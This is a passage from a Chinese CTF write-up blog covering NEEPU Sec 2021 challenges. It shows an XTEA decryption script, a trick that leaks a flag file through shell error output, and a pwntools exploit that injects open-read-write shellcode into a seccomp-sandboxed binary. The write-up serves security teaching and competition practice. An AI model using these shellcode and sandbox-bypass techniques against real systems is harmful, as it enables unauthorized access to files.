<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = </span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XTEA解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">rounds, v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = </span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0x9F5FBC48,0xC5517691] -&gt; [1,1]</span><br><span class="line">[0x24BDF90F,0x301B88E8] -&gt; [3,4]</span><br><span class="line">[0x92750C5A,0xA0D98E0E] -&gt; [2,5]</span><br><span class="line">[0x8DD02793,0x4F558864] -&gt; [8,7]</span><br></pre></td></tr></table></figure><p>故 <code>v4 = [1,1,2,3,4,5,7,8]</code>，又 <code>v9 = v8 = v4^v7</code>，异或得到 <code>v7</code>，先base64解码再RC4解密可得输入的 <code>Source</code> 值，即为flag。</p><p>​</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ncc"><a href="#ncc" class="headerlink" title="ncc"></a>ncc</h3><blockquote><p>经典nc!</p><p>PWN题连接方式: nc neepusec.club 端口</p></blockquote><p><code>ls /</code> 发现目录下有 <code>/flag</code>，但没有 <code>cat</code> 等常见的查看文件内容命令。</p><p><code>cd /bin</code> 进到 <code>/bin</code> 目录下，<code>ls</code> 发现目录下有 <code>sh</code> 脚本执行命令，直接 <code>sh /flag</code> 利用报错泄露 <code>/flag</code> 文件内容。</p><p>​</p><h3 id="easy-shellcode"><a href="#easy-shellcode" class="headerlink" title="easy_shellcode"></a>easy_shellcode</h3><blockquote><p>easy shellcode?</p><p>flag在./flag</p></blockquote><p>checksec发现无任何保护，IDA查看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_9C3(a1, a2, a3);</span><br><span class="line">  buf = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">void</span> *)<span class="number">0x23330000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;just learn orw&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_9C3(a1,a2,a3)</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_9C3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_8CA();</span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x3C</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_8CA()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_8CA</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+12h] [rbp-3Eh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+13h] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-36h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-35h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+22h] [rbp-2Eh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+23h] [rbp-2Dh]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+2Ah] [rbp-26h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+2Bh] [rbp-25h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v27; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="number">21</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">2</span>;</span><br><span class="line">  v10 = <span class="number">-1073741762</span>;</span><br><span class="line">  v11 = <span class="number">32</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">21</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  v18 = <span class="number">59</span>;</span><br><span class="line">  v19 = <span class="number">6</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">6</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">6</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数 <code>sub_8CA()</code> 发现 <code>prctl()</code> 函数。</p><blockquote><p>prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。</p><p>沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp是内核中的一种安全机制，seccomp可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。</p></blockquote><p>使用 <code>seccomp-tools dump ./pwn</code> 看下哪些函数可用：</p><p><img src="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210525013200068.png" alt="image-20210525013200068"></p><p>发现只要不是 <code>execve()</code> 都可以使用，使用 <code>open-&gt;read-&gt;write</code> 这样的orw的方式获取flag。</p><p><code>mmap()</code> 把从0x23330000开始的地址，大小为0x1000的长度，权限改为可写可执行。</p><p>所以只需要写入orw类型的shellcode，然后跳转执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;neepusec.club&#x27;</span>, <span class="number">18146</span>)</span><br><span class="line">mmap = <span class="number">0x23330000</span></span><br><span class="line">orw_payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)         <span class="comment">#打开根目录下的flag文件</span></span><br><span class="line">orw_payload += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     <span class="comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span></span><br><span class="line">orw_payload += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)    <span class="comment">#将mmap地址上的内容输出0x50个字节</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;orw\n&#x27;</span>, asm(orw_payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2021/05/30/match-DozerCTF-2021/" title="DozerCTF 2021"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" title="第四届红帽杯网络安全大赛"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>